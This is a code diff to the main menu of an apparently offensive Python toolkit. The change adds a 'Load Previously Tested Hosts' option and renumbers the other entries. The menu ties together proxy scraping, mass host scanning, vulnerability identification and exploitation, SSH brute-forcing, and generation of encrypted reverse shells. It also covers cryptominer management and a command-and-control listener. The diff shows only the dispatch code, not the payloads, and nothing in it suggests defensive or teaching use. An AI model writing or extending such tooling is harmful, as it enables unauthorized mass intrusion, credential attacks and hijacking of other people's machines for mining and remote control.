@@ -39,21 +39,22 @@ def main_menu():
         print("7.) Load Hosts")
         print("8.) Load IP Ranges")
         print("9.) Test Hosts")
-        print("10.) Scan Hosts")
-        print("11.) Show Results")
-        print("12.) Clear Results")
-        print("13.) Identify Vulnerabilities")
-        print("14.) Exploit Vulnerable Hosts")
-        print("15.) Clear All Chunks")
-        print("16.) Split Large CSVs")
-        print("17.) SSH Bruteforce")
-        print("18.) Configuration Settings")
-        print("19.) Generate Reverse Shell")
-        print("20.) Manage Cryptominers")
-        print("21.) Command and Control Center")
-        print("22.) Exit")
+        print("10.) Load Previously Tested Hosts")  # NEW OPTION
+        print("11.) Scan Hosts")
+        print("12.) Show Results")
+        print("13.) Clear Results")
+        print("14.) Identify Vulnerabilities")
+        print("15.) Exploit Vulnerable Hosts")
+        print("16.) Clear All Chunks")
+        print("17.) Split Large CSVs")
+        print("18.) SSH Bruteforce")
+        print("19.) Configuration Settings")
+        print("20.) Generate Reverse Shell")
+        print("21.) Manage Cryptominers")
+        print("22.) Command and Control Center")
+        print("23.) Exit")
 
-          choice = input("Enter your choice: ")
+        choice = input("Enter your choice: ")
         if choice == "1":
             add_proxy_sources()
         elif choice == "2":
@@ -64,7 +65,7 @@ def main_menu():
             global_tested_proxies[:] = test_proxies(global_scraped_proxies)
         elif choice == "5":
             clear_proxies()
-        elif choice == "6":  # LOAD PREVIOUSLY CHECKED PROXIES
+        elif choice == "6":
             global_scraped_proxies[:] = load_checked_proxies()
         elif choice == "7":
             global_hosts[:] = load_hosts()
@@ -72,19 +73,21 @@ def main_menu():
             global_hosts[:] = load_ip_ranges()
         elif choice == "9":
             global_live_hosts[:] = test_hosts(global_hosts, global_tested_proxies)
-        elif choice == "10":
-            scan_hosts()
+        elif choice == "10":  # LOAD PREVIOUSLY TESTED HOSTS
+            global_live_hosts[:] = load_tested_hosts()
         elif choice == "11":
-            show_results()
+            scan_hosts()
         elif choice == "12":
-            clear_results()
+            show_results()
         elif choice == "13":
-            global_vulnerable_hosts[:] = identify_vulnerable_hosts(global_live_hosts)
+            clear_results()
         elif choice == "14":
-            exploit_vulnerable_hosts(global_vulnerable_hosts)
+            global_vulnerable_hosts[:] = identify_vulnerable_hosts(global_live_hosts)
         elif choice == "15":
-            clear_all_chunks()
+            exploit_vulnerable_hosts(global_vulnerable_hosts)
         elif choice == "16":
+            clear_all_chunks()
+        elif choice == "17":
             base_dir = "ip_ranges"
             max_lines = input("Enter the maximum number of lines per chunk (default 200): ")
             try:
@@ -92,7 +95,7 @@ def main_menu():
             except ValueError:
                 max_lines = 200
             split_large_csvs(base_dir, max_lines)
-        elif choice == "17":
+        elif choice == "18":
             if not global_live_hosts:
                 print("[ERROR] No valid live hosts found.")
                 continue
@@ -102,9 +105,9 @@ def main_menu():
                 print("[ERROR] Missing or empty wordlists.")
                 continue
             bruteforce_ssh(targets, usernames, passwords, max_threads=5)
-        elif choice == "18":
-            configure_settings()
         elif choice == "19":
+            configure_settings()
+        elif choice == "20":
             payloads = list_payloads()
             if not payloads:
                 continue
@@ -126,7 +129,7 @@ def main_menu():
                 encrypt_choice = input("Encrypt the shell? (yes/no): ").strip().lower()
                 if encrypt_choice == "yes":
                     encrypt_generated_shell(shell_path)
-        elif choice == "20":
+        elif choice == "21":
             print("\n[ Cryptominer Management ]")
             print("1.) List Cryptominers")
             print("2.) Encrypt All Cryptominers")
@@ -138,7 +141,7 @@ def main_menu():
                 encrypt_all_cryptominers()
             elif miner_choice == "3":
                 continue
-        elif choice == "21":
+        elif choice == "22":
             print("\n[ Command and Control Center ]")
             print("1.) Start Listener")
             print("2.) Command Interface")
@@ -168,11 +171,10 @@ def main_menu():
                 continue
             else:
                 print("[ERROR] Invalid choice.")
-        elif choice == "22":
+        elif choice == "23":
             print("[INFO] Exiting. Stopping all listeners and background tasks.")
             stop_listeners()
             break
-
 
 
 def setup_keyboard_controls():
